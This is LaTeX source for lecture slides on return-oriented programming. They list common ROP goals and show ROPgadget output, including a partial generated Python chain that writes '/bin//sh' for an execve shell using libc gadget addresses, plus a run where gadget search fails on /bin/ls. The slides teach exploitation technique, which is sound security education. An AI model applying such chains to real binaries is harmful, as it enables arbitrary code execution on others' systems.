
\begin{frame}{common, reusable ROP sequences}
    \begin{itemize}
        \item most common idea: run a shell (command prompt)
            \begin{itemize}
            \item same thing `shellcode is named after'
            \item \texttt{ROPchain --binary example --ropchain} tries to do this
            \end{itemize}
        \item another possibilities: make memory executable + jump
            \begin{itemize}
            \item make `normal' shellcode work
            \end{itemize}
        \item probably more ideas
        \vspace{.5cm}
        \item if finding one of these in popular library\ldots
        \item can reuse across a lot of applications
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=ropchainex1]{ROPgadget --ropchain (works)}
\begin{lstlisting}[language={},style=script]
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 \
             --offset 0x10000000 --ropchain
...
        #!/usr/bin/env python
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = b''
        p += pack('<Q', 0x00000000101056fd) # pop rdx ; pop rcx ; pop rbx ; ret
        p += pack('<Q', 0x00000000101eb1a0) # @ .data
        p += pack('<Q', 0x4141414141414141) # padding
        p += pack('<Q', 0x4141414141414141) # padding
        p += pack('<Q', 0x000000001004a550) # pop rax ; ret
        p += b'/bin//sh'
        p += pack('<Q', 0x00000000100374b0) # mov qword ptr [rdx], rax ; ret
...
\end{lstlisting}
\end{frame}

\begin{frame}[fragile,label=ropchainex]{ROPgadget --ropchain (does not work?)}
\begin{lstlisting}[language={},style=script]
ROPgadget --binary /bin/ls --ropchain
...
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x7694 mov byte ptr [rax], 0xa ; pop rbx ; pop rbp ; pop r12 ; ret
        [-] Can't find the 'pop rax' gadget. Try with another 'mov [reg], reg'

        [-] Can't find the 'mov qword ptr [r64], r64' gadget
...
\end{lstlisting}
\end{frame}
